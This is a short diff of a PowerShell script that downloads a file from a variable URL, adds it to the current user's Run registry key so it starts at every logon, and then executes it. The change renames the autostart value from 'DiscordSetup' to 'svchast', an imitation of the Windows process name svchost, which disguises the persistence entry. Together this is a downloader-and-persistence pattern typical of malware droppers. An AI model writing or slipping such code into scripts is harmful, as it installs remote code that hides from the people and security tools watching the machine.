@@ -33,7 +33,7 @@ Write-Host "Downloading: $DownloadURL"
 try {
     Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
     Write-Host "Download completed: $FilePath"
-    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DiscordSetup" /t REG_SZ /d "`"$FilePath`"" /f | Out-Null
+    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchast" /t REG_SZ /d "`"$FilePath`"" /f | Out-Null
     
     Write-Host "Starting installation..."
     Start-Process -FilePath $FilePath -Wait
